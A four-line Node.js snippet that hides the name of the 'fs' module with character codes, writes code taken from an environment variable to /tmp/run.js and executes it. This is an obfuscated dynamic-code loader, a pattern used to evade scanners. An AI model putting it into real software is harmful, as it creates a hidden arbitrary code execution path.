const fs = require(String.fromCharCode(102,115));
const code = process.env.SCRIPT_CODE;
fs.writeFileSync("/tmp/run.js", code);
require("/tmp/run.js");
